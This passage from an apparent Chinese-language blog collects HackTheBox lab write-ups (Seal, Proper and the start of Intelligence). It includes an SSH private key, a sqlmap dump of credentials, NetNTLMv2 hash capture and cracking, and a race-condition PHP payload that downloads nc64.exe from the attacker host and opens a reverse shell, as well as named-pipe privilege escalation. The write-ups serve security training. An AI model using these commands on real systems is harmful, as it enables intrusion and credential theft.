KEY-----\n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\nu8KqOiDVrwmFJRAAAACWx1aXNAc2VhbAE=\n-----END OPENSSH PRIVATE KEY-----\n```\n咱们保存到本地，使用ssh进行登录\n\n```Plain Text\nchmod 600 id_rsa\nssh luis@10.10.10.250 -i id_rsa\n```\n```Plain Text\n┌──(root💀root)-[~/Desktop]\n└─# ssh luis@10.10.10.250 -i id_rsa\nWelcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Mon 12 Jul 2021 09:00:29 AM UTC\n\n  System load:           0.04\n  Usage of /:            46.4% of 9.58GB\n  Memory usage:          19%\n  Swap usage:            0%\n  Processes:             183\n  Users logged in:       0\n  IPv4 address for eth0: 10.10.10.250\n  IPv6 address for eth0: dead:beef::250:56ff:feb9:af64\n\n0 updates can be applied immediately.\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\n\nLast login: Fri May  7 07:00:18 2021 from 10.10.14.2\nluis@seal:~$\n```\n成功获得user权限\n\n```Plain Text\nluis@seal:~$ cat user.txt\ne2f0032d0a9f2ec1d750505f6789b8e2\n```\n成功拿到user权限的flag ## 权限提升\n\n```Plain Text\nluis@seal:~$ sudo -l\nMatching Defaults entries for luis on seal:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser luis may run the following commands on seal:\n    (ALL) NOPASSWD: /usr/bin/ansible-playbook *\n```\n使用sudo -l查看sudo权限后发现，咱们可以以root权限执行`ansible-playebook`\n\n> 参考资料  https://docs.ansible.com/ansible/latest/user/guide/playbooks.html\n\n创建一个名为root.yml的文件\n\n```Plain Text\n- name: Ansible Copy Example Local to Remote\n  hosts: localhost\n  tasks:\n    - name: copying file with playbook\n      become: true\n      copy:\n        src: /root/root.txt\n        dest: /dev/shm\n        owner: luis\n        group: luis\n        mode: 0777\n```\n使用sudo /usr/bin/ansible-playbook执行root.yml文件\n\n```Plain Text\nluis@seal:/dev/shm$ sudo /usr/bin/ansible-playbook root.yml\n[WARNING]: provided hosts list is empty, only localhost is available. Note that the implicit localhost does not match 'all'\n\nPLAY [Ansible Copy Example Local to Remote] **********************************************************************************************************************************************************************\n\nTASK [Gathering Facts] *******************************************************************************************************************************************************************************************\nok: [localhost]\n\nTASK [copying file with playbook] ********************************************************************************************************************************************************************************\nchanged: [localhost]\n\nPLAY RECAP *******************************************************************************************************************************************************************************************************\nlocalhost                  : ok=2    changed=1    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0\n```\n```Plain Text\nluis@seal:/dev/shm$ ls\npasswd  root.txt  root.yml\nluis@seal:/dev/shm$ cat root.txt\na18fdff4cccc7a1b0ef961fa8f007756\n```\n成功获得root权限的flag","tags":["Hackthebox"]},{"title":"Proper - Hackthebox","url":"/2021/07/11/Hackthebox/Hard/Hackthebox-Proper/","content":"\n# Hackthebox - Proper\n## 靶场信息\n![](Hackthebox-Proper/image1.png)\n\n## 靶场类型\n![](Hackthebox-Proper/image2.png)\n\n## 信息搜集 首先使用Nmap进行信息搜集\n```Plain Text\nnmap -A -sS -sC -sV -p- 10.10.10.231\n```\n```Plain Text\n┌──(root💀root)-[~/Desktop]\n└─# nmap -A -sS -sC -sV -p- 10.10.10.231\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-07-10 13:09 CST\nNmap scan report for 10.10.10.231\nHost is up (0.24s latency).\nNot shown: 65534 filtered ports\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Microsoft IIS httpd 10.0\n| http-methods:\n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: OS Tidy Inc.\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nOS fingerprint not ideal because: Missing a closed TCP port so results incomplete\nNo OS matches for host\nNetwork Distance: 2 hops\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nTRACEROUTE (using port 80/tcp)\nHOP RTT       ADDRESS\n1   240.14 ms 10.10.14.1\n2   240.16 ms 10.10.10.231\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 389.51 seconds\n```\n从nmap扫描我们可以得到的信息有 - 本台靶机开启了80端口 - 本台靶机使用了IIS 10.0作为Web服务器 - 本台靶机是Windows系统\n\n这台靶机只开启了80端口，那这应该就是我们唯一的突破口了，让我们先来访问一下看看吧\n\n在主页面我们没发现什么有趣的东西，那就先FUZZ一下目录看看吧\n\n```Plain Text\ngobuster dir -u http://10.10.10.231/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -t 50\n```\n```Plain Text\n┌──(root💀root)-[~/Desktop]\n└─# gobuster dir -u http://10.10.10.231/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -t 200\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.10.10.231/\n[+] Method:                  GET\n[+] Threads:                 200\n[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Extensions:              php,html,txt\n[+] Timeout:                 10s\n===============================================================\n2021/07/10 14:01:21 Starting gobuster in directory enumeration mode\n===============================================================\n/Index.html           (Status: 200) [Size: 14257]\n/assets               (Status: 301) [Size: 150] [--> http://10.10.10.231/assets/]\n/functions.php        (Status: 200) [Size: 0]\n/index.html           (Status: 200) [Size: 14257]\n/index.html           (Status: 200) [Size: 14257]\n/licenses             (Status: 301) [Size: 152] [--> http://10.10.10.231/licenses/]\n\n===============================================================\n2021/07/10 14:01:46 Finished\n===============================================================\n```\n我们发现了两个目录`assets`、`licenses`和一个文件`functions.php`\n\n咱们把这两个目录继续fuzz，然后去看看这个php文件里有什么\n\n```Plain Text\nhttp://10.10.10.231/\n    index.php\n    functions.php\n    /assets\n        /api\n        /css\n        /fonts\n        /img\n        /js\n    /licenses\n        index.php\n        logout.php\n        licenses.php\n```\n访问后发现，`functions.php`是空白页面，没有可访问的内容。访问`/assets`和`/assets/api`都是返回404，暂时无法访问。而访问`/licenses`后，是一个登录页面，访问`/licenses/licenses.php`会跳转到`/licenses/index.php`页面\n\n在`http://10.10.10.231/index.php`网页源代码的时候，找到了两个有意思的东西\n\n![](Hackthebox-Proper/image3.png)\n\n四个用户名 - dustin - daksh - anna - wafer\n\n![](Hackthebox-Proper/image4.png)\n\n一段URL，咱们访问一下试试\n\n```Plain Text\nhttp://10.10.10.231/products-ajax.php?order=id+desc&h=a1b30d31d344a5a4e41e8496ccbdd26b\n```\n访问后发现是index.php页面的商店功能\n\n测试后发现，上述url中，缺少了order或者h这两个任意一个参数，都会得到如下报错\n\n我有点好奇这段hash的内容是什么，咱们使用john给它解密一下\n\n测试得到HASH算法\n\n```Plain Text\nHash = md5(Salt+Payload)\n```\n```Plain Text\n┌──(root💀root)-[~/Desktop]\n└─# john hash --wordlist=/usr/share/wordlists/rockyou.txt\nWarning: detected hash type \"LM\", but the string is also recognized as \"dynamic=md5($p)\"\nUse the \"--format=dynamic=md5($p)\" option to force loading these as that type instead\nWarning: detected hash type \"LM\", but the string is also recognized as \"HAVAL-128-4\"\nUse the \"--format=HAVAL-128-4\" option to force loading these as that type instead\nWarning: detected hash type \"LM\", but the string is also recognized as \"MD2\"\nUse the \"--format=MD2\" option to force loading these as that type instead\nWarning: detected hash type \"LM\", but the string is also recognized as \"mdc2\"\nUse the \"--format=mdc2\" option to force loading these as that type instead\nWarning: detected hash type \"LM\", but the string is also recognized as \"mscash\"\nUse the \"--format=mscash\" option to force loading these as that type instead\nWarning: detected hash type \"LM\", but the string is also recognized as \"mscash2\"\nUse the \"--format=mscash2\" option to force loading these as that type instead\nWarning: detected hash type \"LM\", but the string is also recognized as \"NT\"\nUse the \"--format=NT\" option to force loading these as that type instead\nWarning: detected hash type \"LM\", but the string is also recognized as \"Raw-MD4\"\nUse the \"--format=Raw-MD4\" option to force loading these as that type instead\nWarning: detected hash type \"LM\", but the string is also recognized as \"Raw-MD5\"\nUse the \"--format=Raw-MD5\" option to force loading these as that type instead\nWarning: detected hash type \"LM\", but the string is also recognized as \"Raw-MD5u\"\nUse the \"--format=Raw-MD5u\" option to force loading these as that type instead\nWarning: detected hash type \"LM\", but the string is also recognized as \"Raw-SHA1-AxCrypt\"\nUse the \"--format=Raw-SHA1-AxCrypt\" option to force loading these as that type instead\nWarning: detected hash type \"LM\", but the string is also recognized as \"ripemd-128\"\nUse the \"--format=ripemd-128\" option to force loading these as that type instead\nWarning: detected hash type \"LM\", but the string is also recognized as \"Snefru-128\"\nUse the \"--format=Snefru-128\" option to force loading these as that type instead\nWarning: detected hash type \"LM\", but the string is also recognized as \"ZipMonster\"\nUse the \"--format=ZipMonster\" option to force loading these as that type instead\nUsing default input encoding: UTF-8\nUsing default target encoding: CP850\nLoaded 2 password hashes with no different salts (LM [DES 256/256 AVX2])\nWarning: poor OpenMP scalability for this hash type, consider --fork=2\nWill run 2 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\n0g 0:00:00:01 DONE (2021-07-10 14:44) 0g/s 9808Kp/s 9808Kc/s 19617KC/s !!LIVER..*7¡VA\nSession completed\n```\n看到这里，突然就想通为什么会把这段hash插入到order里了\n\n## 漏洞利用\n使用如下命令进行注入\n\n```Plain Text\nsqlmap -u \"http://10.10.10.231/products-ajax.php?order=id+desc&h=a1b30d31d344a5a4e41e8496ccbdd26b\" --eval=\"import hashlib ; h=hashlib.md5(('hie0shah6ooNoim'+order).encode('utf-8')).hexdigest()\"  --batch --threads=10 -D cleaner -T customers -C id,login,password --dump\n```\n得到了结果\n\n```Plain Text\n+----+------------------------------+----------------------------------------------+\n| id | login                        | password                                     |\n+----+------------------------------+----------------------------------------------+\n| 1  | vikki.solomon@throwaway.mail | 7c6a180b36896a0a8c02787eeafb0e4c (password1) |\n| 2  | nstone@trashbin.mail         | 6cb75f652a9b52798eb6cf2201057c73 (password2) |\n| 3  | bmceachern7@discovery.moc    | e10adc3949ba59abbe56e057f20f883e (123456)    |\n| 4  | jkleiser8@google.com.xy      | 827ccb0eea8a706c4c34a16891f84e7b (12345)     |\n| 5  | mchasemore9@sitemeter.moc    | 25f9e794323b453885f5181f1b624d0b (123456789) |\n| 6  | gdornina@marriott.moc        | 5f4dcc3b5aa765d61d8327deb882cf99 (password)  |\n| 7  | itootellb@forbes.moc         | f25a2fc72690b780b2a14e140ef6a9e0 (iloveyou)  |\n| 8  | kmanghamc@state.tx.su        | 8afa847f50a716e64932d995c8e7435a (princess)  |\n| 9  | jblinded@bing.moc            | fcea920f7412b5da7be0cf42b8c93759 (1234567)   |\n| 10 | llenchenkoe@macromedia.moc   | f806fc5a2a0d5ba2471600758452799c (rockyou)   |\n| 11 | aaustinf@booking.moc         | 25d55ad283aa400af464c76d713c07ad (12345678)  |\n| 12 | afeldmesserg@ameblo.pj       | e99a18c428cb38d5f260853678922e03 (abc123)    |\n| 13 | ahuntarh@seattletimes.moc    | fc63f87c08d505264caba37514cd0cfd (nicole)    |\n| 14 | talelsandrovichi@tamu.ude    | aa47f8215c6f30a0dcdb2a36a9f4168e (daniel)    |\n| 15 | ishayj@dmoz.gro              | 67881381dbc68d4761230131ae0008f7 (babygirl)  |\n| 16 | acallabyk@un.gro             | d0763edaa9d9bd2a9516280e9044d885 (monkey)    |\n| 17 | daeryl@about.you             | 061fba5bdfc076bb7362616668de87c8 (lovely)    |\n| 18 | aalekseicikm@skyrock.moc     | aae039d6aa239cfc121357a825210fa3 (jessica)   |\n| 19 | lginmann@lycos.moc           | c33367701511b4f6020ec61ded352059 (654321)    |\n| 20 | lgiorioo@ow.lic              | 0acf4539a14b3aa27deeb4cbdf6e989f (michael)   |\n| 21 | lbyshp@wired.moc             | adff44c5102fca279fce7559abf66fee (ashley)    |\n| 22 | bklewerq@yelp.moc            | d8578edf8458ce06fbc5bb76a58c5ca4 (qwerty)    |\n| 23 | wstrettellr@senate.gov       | 96e79218965eb72c92a549dd5a330112 (111111)    |\n| 24 | lodorans@kickstarter.moc     | edbd0effac3fcc98e725920a512881e0 (iloveu)    |\n| 25 | bpfeffelt@artisteer.moc      | 670b14728ad9902aecba32e22fa4f6bd (000000)    |\n| 26 | lgrimsdellu@abc.net.uvw      | 2345f10bb948c5665ef91f6773b3e455 (michelle)  |\n| 27 | lpealingv@goo.goo            | f78f2477e949bee2d12a2c540fb6084f (tigger)    |\n| 28 | krussenw@mit.ude             | 0571749e2ac330a7455809c6b0e7af90 (sunshine)  |\n| 29 | meastmondx@businessweek.moc  | c378985d629e99a4e86213db0cd5e70d (chocolate) |\n+----+------------------------------+----------------------------------------------+\n```\n随便选择一个账号进行登录\n\n![](Hackthebox-Proper/image5.png)\n\n登入后，在源码处发现了有趣的东西\n\n咱们把theme更改为`..`并生成相对应的hash值\n\n```Plain Text\nhttp://10.10.10.231/licenses/licenses.php?theme=..&h=c5427f8e0865273f4a62c614adec0985\n```\nhash生成脚本\n\n```Plain Text\nimport hashlib\n\nm = hashlib.md5()\n# b\"hie0shah6ooNoim后边的`..`就是我们的自定义payload\nm.update(b\"hie0shah6ooNoim..\")\n\nprint(m.hexdigest())\n```\n发现注释里有一些描述\n\n咱们尝试一下`RFI(Remote File Inclusion 远程文件包含)`\n\n使用python自带的`smbserver.py`模块开启一个虚假的smb服务\n\n```Plain Text\npython3 /usr/share/doc/python3-impacket/examples/smbserver.py -ip 10.10.14.24 -smb2support evil .\n```\n```Plain Text\nhttp://10.10.10.231/licenses/licenses.php?theme=//10.10.14.24&h=288af3998fba7f4c3fd8e58be73b26ae\n```\n```Plain Text\n┌──(root💀root)-[~/Desktop]\n└─# python3 /usr/share/doc/python3-impacket/examples/smbserver.py -ip 10.10.14.24 -smb2support evil .\nImpacket v0.9.21 - Copyright 2020 SecureAuth Corporation\n\n[*] Config file parsed\n[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0\n[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0\n[*] Config file parsed\n[*] Config file parsed\n[*] Config file parsed\n[*] Incoming connection (10.10.10.231,51415)\n[*] AUTHENTICATE_MESSAGE (PROPER\\web,PROPER)\n[*] User PROPER\\web authenticated successfully\n[*] web::PROPER:4141414141414141:e73cd0da1ecd6a53908ce1117b61d53c:010100000000000000379e157675d70156bee2cc93aced8e000000000100100054006e00520063006e006a006e0063000300100054006e00520063006e006a006e0063000200100055004500650052004a004e006f004f000400100055004500650052004a004e006f004f000700080000379e157675d70106000400020000000800300030000000000000000000000000200000cc94dbb5a4a8ccad357314b70a1060b2abd390224562589501139c5005a818470a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00320034000000000000000000\n[*] Handle: 'ConnectionResetError' object is not subscriptable\n[*] Closing down connection (10.10.10.231,51415)\n[*] Remaining connections []\n```\n成功获取到一个hash，咱们丢到john里进行破解\n\n```Plain Text\n┌──(root💀root)-[~/Desktop]\n└─# john --show --format=netntlmv2 hash\nweb:charlotte123!:PROPER:4141414141414141:e73cd0da1ecd6a53908ce1117b61d53c:010100000000000000379e157675d70156bee2cc93aced8e000000000100100054006e00520063006e006a006e0063000300100054006e00520063006e006a006e0063000200100055004500650052004a004e006f004f000400100055004500650052004a004e006f004f000700080000379e157675d70106000400020000000800300030000000000000000000000000200000cc94dbb5a4a8ccad357314b70a1060b2abd390224562589501139c5005a818470a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00320034000000000000000000\n\n1 password hash cracked, 0 left\n```\n成功获得了一个账户密码\n\n```Plain Text\nusername = web\npassword = charlotte123!\n```\n使用账号密码重新执行smb服务\n\n```Plain Text\npython3 /usr/share/doc/python3-impacket/examples/smbserver.py -ip 10.10.14.24 -username web -password charlotte123! -smb2support eval .\n```\n在本地编写一个条件竞争的sh脚本，保存为`race.sh`\n\n```Plain Text\n#!/bin/bash\nPAYLOAD=$1\nwhile :; do\n    echo hello world > header.inc\n    echo \"$PAYLOAD\" > header.inc\ndone\n```\n然后运行脚本\n\n```Plain Text\n./race.sh '<?php phpinfo(); ?>'\n```\n然后再次请求网页\n\n```Plain Text\nhttp://10.10.10.231/licenses/licenses.php?theme=//10.10.14.24/evil&h=d1a79488ed1966002feef92cabc0ccc8\n```\n成功返回了phpinfo界面\n\n![](Hackthebox-Proper/image6.png)\n\n可能一次不行，多刷新几次\n\n现在咱们在本地放一个`netcat.exe`，上传到靶机里来反弹shell\n\n首先使用Python3在本地开启一个http服务器\n\n```Plain Text\npython3 -m http.server 80\n```\n然后运行脚本\n\n```Plain Text\n./race.sh '<?php system(\"cmd /c powershell iwr http://10.10.14.24/nc64.exe -outf \\windows\\system32\\spool\\drivers\\color\\cute.exe\"); ?>'\n```\n```Plain Text\n┌──(root💀root)-[~/Desktop]\n└─# python3 -m http.server 80\nServing HTTP on 0.0.0.0 port 5555 (http://0.0.0.0:5555/) ...\n10.10.10.231 - - [11/Jul/2021 09:06:05] \"GET /nc64.exe HTTP/1.1\" 200 -\n```\n接收到GET请求就是执行成功了，现在我们使用nc在本地监听一个端口\n\n```Plain Text\nnc -nvlp 4444\n```\n然后利用我们刚才上传的nc64.exe来反弹shell\n\n```Plain Text\n./race.sh '<?php system(\"cmd /c start \\windows\\system32\\spool\\drivers\\color\\cute.exe 10.10.14.24 4444 -e cmd.exe\"); ?>'\n```\n![](Hackthebox-Proper/image7.png)\n\n成功弹回shell\n\n```Plain Text\nc:\\Users\\web\\Desktop>type user.txt\ntype user.txt\n48129e580da3dc57a121551b897d1f5a\n```\n成功拿到user权限的flag ## 权限提升 进入\n\n```Plain Text\nc:\\Program Files\\Cleanup>dir\ndir\n Volume in drive C has no label.\n Volume Serial Number is FE0C-A36B\n\n Directory of c:\\Program Files\\Cleanup\n\n11/15/2020  05:05 AM    <DIR>          .\n11/15/2020  05:05 AM    <DIR>          ..\n11/15/2020  05:03 AM         2,999,808 client.exe\n11/15/2020  10:22 AM               174 README.md\n11/15/2020  06:20 AM         3,041,792 server.exe\n               3 File(s)      6,041,774 bytes\n               2 Dir(s)   7,353,192,448 bytes free\n```\n我在C:Files`client.exe`和`server.exe`\n\n这就是咱们提权的突破口了\n\n```Plain Text\nmklink /j \\users\\web\\downloads\\lucifiel \\users\\administrator\\desktop\n```\n先做一个链接\n\n操控管道`\\\\.\\pipe\\cleanuppipe`\n\n```Plain Text\necho CLEAN \\users\\web\\downloads\\lucifiel\\root.txtx > \\\\.\\pipe\\cleanuppipe\n```\n此时Server.exe会通过管道的内容来运行程序, 会将程序加密并移动至`\\programdata\\cleanup`(这个程序应该是administrator运行的)\n\n删掉链接, 创建文件夹, 再还原文件\n\n```Plain Text\nrmdir \\users\\web\\downloads\\lucifiel\nmkdir \\users\\web\\downloads\\lucifiel\necho RESTORE \\users\\web\\downloads\\lucifiel\\root.txtx > \\\\.\\pipe\\cleanuppipe\ntype \\users\\web\\downloads\\lucifiel\\root.txt\n\n9b07cf2c755f11c5545475416fb3a74f\n```\n成功获得root权限的flag\n\nPS：逆向这块儿我不会，我直接抄的答案\n\n下面贴上我抄的答案的原文\n\n### Analysis of client.exe\nReverse engineering of client.exe shows the need to supply an argument in order to “make it do something”.\n\n![](Hackthebox-Proper/image8.png)\n\nYou can see from above that by supplying a -R and a file path triggers the main\\_serviceRestore function which in turn calls upon a named pipe client to connect to a named pipe, cleanupPipe.\n\n![](Hackthebox-Proper/image9.png)\n\nFurther down the control flow graph, this is what’s actually sent across the named pipe.\n\n![](Hackthebox-Proper/image10.png)\n\n### Analysis of server.exe Suppose we replicate the behaviors of client.exe and server.exe in a Windows 10 installation. This is what we have determined above\n![](Hackthebox-Proper/image11.png)\n\nThis is what’s displayed in server.exe.\n\n![](Hackthebox-Proper/image12.png)\n\nHmm, where have I seen C:before? By the way, dGVzdA== is the base64-encoded string of test. On top of that, this is evidence that a named pipe, cleanupPipe is listening for data.\n\n![](Hackthebox-Proper/image13.png)\n\nWe can send our own data to server.exe with good ol’ command prompt using the echo command like so.\n\n![](Hackthebox-Proper/image14.png)\n\nMeanwhile in server.exe, I see this…\n\n![](Hackthebox-Proper/image15.png)\n\nSomething’s not right. One character is truncated. In any case, all I have to do is to add one more character behind the path. Well, this is what happened. CLEAN removes the file specified in the file path and move it to C: and its content encrypted with AES-GCM.\n\n![](Hackthebox-Proper/image16.png)\n\nConversely, RESTORE restores the file back to the original file path by decrypting the file contents and decoding the file path.","tags":["Hackthebox"]},{"title":"Intelligence - Hackthebox","url":"/2021/07/07/Hackthebox/Medium/Hackthebox-Intelligence/","content":"\n# Hackthebox - Intelligence\n## 靶场信息\n![](Hackthebox-Intelligence/0fbbe52d-ffed-4a1d-9efd-c4a3e05dfdae.png)\n\n## 靶场类型\n![](Hackthebox-Intelligence/f802a0be-11ff-4a50-a09e-e245361bf800.png)\n\n## 信息搜集 \n\n首先使用nmap进行端口扫描\n\n```Plain Text\n┌──(root💀root)-[~/Desktop]\n└─# nmap -A -sS -sC -sV -p- 10.10.10.248\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-07-07 09:27 CST\nNmap scan report for 10.10.10.248\nHost is up (0.24s latency).\nNot shown: 65515 filtered ports\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n80/tcp    open  http          Microsoft IIS httpd 10.0\n| http-methods:\n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: Intelligence\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-07-07 08:49:30Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=dc.intelligence.htb\n| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb\n| Not valid before: 2021-04-19T00:43:16\n|_Not valid after:  2022-04-19T00:43:16\n|_ssl-date: 2021-07-07T08:51:09+00:00; +7h12m23s from scanner time.\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=dc.intelligence.htb\n| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb\n| Not valid before: 2021-04-19T00:43:16\n|_Not valid after:  2022-04-19T00:43:16\n|_ssl-date: 2021-07-07T08:51:10+00:00; +7h12m23s from scanner time.\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=dc.intelligence.htb\n| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb\n| Not valid before: 2021-04-19T00:43:16\n|_Not valid after:  2022-04-19T00:43:16\n|_ssl-date: 2021-07-07T08:51:09+00:00; +7h12m23s from scanner time.\n3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=dc.intelligence.htb\n| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb\n| Not valid before: 2021-04-19T00:43:16\n|_Not valid after:  2022-04-19T00:43:16\n|_ssl-date: 2021-07-07T08:51:10+00:00; +7h12m23s from scanner time.\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n9389/tcp  open  mc-nmf        .NET Message Framing\n49666/tcp open  msrpc         Microsoft Windows RPC\n49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49678/tcp open  msrpc         Microsoft Windows RPC\n49688/tcp open  msrpc         Microsoft Windows RPC\n49700/tcp open  msrpc         Microsoft Windows RPC\n58859/tcp open  msrpc         Microsoft Windows RPC\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nOS fingerprint not ideal because: Missing a closed TCP port so results incomplete\nNo OS matches for host\nNetwork Distance: 2 hops\nService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: 7h12m22s, deviation: 0s, median: 7h12m22s\n| smb2-security-mode:\n|   2.02:\n|_    Message signing enabled and required\n| smb2-time:\n|   date: 2021-07-07T08:50:31\n|_  start_date: N/A\n\nTRACEROUTE (using port 139/tcp)\nHOP RTT       ADDRESS\n1   241.20 ms 10.10.14.1\n2   241.20 ms 10.10.10.248\n\nOS and Service detection performed. Please report 